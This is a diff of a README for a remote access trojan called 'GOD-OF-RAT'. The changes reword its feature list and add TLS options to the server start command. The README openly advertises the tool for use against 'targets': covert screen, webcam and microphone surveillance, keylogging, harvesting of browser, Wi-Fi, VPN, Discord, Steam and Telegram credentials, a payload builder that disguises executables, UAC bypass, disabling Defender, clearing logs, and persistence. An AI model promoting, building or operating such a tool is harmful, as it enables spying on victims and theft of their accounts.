@@ -48,22 +48,41 @@
 </p>
 
 
-### ◈ WHAT YOU GET
+---
 
-| Category | Capabilities |
-| :--- | :--- |
-| **Async C2 Core** | A Python asyncio server that handles hundreds of agents at once. It's fast, stable, and won't choke under load. |
-| **Agent Builder** | A simple GUI to build your payload. Pick which modules you want, add an AES key, change the icon or COPY icon from other's EXE, fake the file metadata, turn on Anti‑VM protection, pad the file size, or set up automatic persistence. Everything happens before you click compile. |
-| **Telegram Bot Multiplexer** | You can run several Telegram bots at the same time. Each user gets their own isolated session, which makes team work clean and organized. |
-| **AES‑256 Encryption** | All traffic between the server, controller, and agents is encrypted. If you just want to test things, you can switch to plain text mode. |
-| **Remote Shell** | An interactive command line that works exactly like your local terminal. Execute any system command and see the output in real time. |
-| **File Manager** | Browse remote files, upload by dragging and dropping, download anything, delete files, or run executables. Folders are automatically zipped before upload. So satisfying to use. |
-| **Live Surveillance** | Stream the target's screen live, watch through their webcam, listen to their microphone, take screenshots, or log every keystroke either continuously or for a set amount of time. |
-| **Best Keylogger** | The keylogger is one of the best parts of this framework. Supports absolutely any keyboard layout. Clean, readable output without garbage or extra symbols.  |
-| **Credentials Harvesting** | Extract saved Wi‑Fi passwords, browser logins from Chrome, Edge, Firefox, and Brave, OpenVPN credentials, and whole Telegram session folders. |
-| **Evasion and Persistence** | Bypass UAC using the Fodhelper trick. Disable Windows Defender, turn off the firewall, avoid virtual machine detection, and clear event logs. To maintain access, you can use Registry autorun, Startup folder shortcuts, Scheduled Tasks, WMI event subscriptions, or install as a Windows service. |
-| **Windows Management** | Edit the registry remotely, manage services, view scheduled tasks, control WMI subscriptions, and kill or monitor processes. |
-| **Fun Modules** | Zoom the screen, invert mouse movement, make the mouse act drunk, shake windows, leave ghost trails behind the cursor, show endless alert popups, or disable the Task Manager. There's more where that came from. |
+## Features
+
+- ### Live FULL Control
+Control the target screen via live stream. **FULL CONTROL** with mouse and keyboard input. Stream the target's screen live, watch the webcam, listen to the microphone, take screenshots, or log every keystroke — either continuously or for a set amount of time.
+
+- ### Credentials Harvesting
+Extract Wi-Fi **passwords**, browser secrets (Chrome, Edge, Firefox, Brave, Opera), OpenVPN credentials, **STEAM** tokens, **Discord** tokens, and **Telegram** tdata session data.
+
+- ### Interactive Agent Builder
+A simple GUI to build your payload. Pick which modules you want, add an AES key, change the icon or copy the icon from another EXE, fake file metadata, enable Anti-VM protection, pad the file size, or set up automatic persistence. Everything happens before you click compile.
+
+- ### Telegram Bot Multiplexer
+Run several Telegram bots simultaneously. Each user gets their own isolated session, making team collaboration clean and organized.
+
+- ### AES-256 Encryption
+All traffic between the server, controller, and agents is encrypted. For testing purposes, you can switch to plain text mode.
+
+- ### Remote Shell
+An interactive command line that works exactly like your local terminal. Execute any system command and see the output in real time.
+
+- ### File System Manager
+Browse remote files, upload by dragging and dropping, download anything, delete files, or run executables. Folders are automatically zipped before upload.
+
+- ### Evasion & Persistence
+UAC Bypass via Fodhelper, disable Defender and Firewall, Anti-VM detection, Event Log cleaner, Smart Trace cleaner, and various persistence techniques.
+
+- ### Windows Management
+Edit the registry remotely, manage services and network connections, view scheduled tasks, control WMI subscriptions, and kill or monitor processes.
+
+- ### Fun Modules
+Screen zoom, mouse inverter, drunk mouse, window shake, mouse trail ghosts, persistent alert boxes, disable Task Manager, and more.
+
+---
 <p align="center">
 <sub>Feel free to submit PRs, suggest new modules, or improve existing ones.</sub>
 </p>
@@ -81,7 +100,7 @@ cd GOD-OF-RAT
 pip install -r requirements.txt
 ```
 ```bash
-python server.py [--aes-key '$aeskey']  # Start server
+python server.py [--aes-key '$aeskey'] [--cert 'serv.crt' --key 'serv.key' ]  # Start server | with WSS:// (optional)
 python controller.py  # Launch GUI (another terminal)
 
 # Make sure encryption.py is in the same directory as server.py
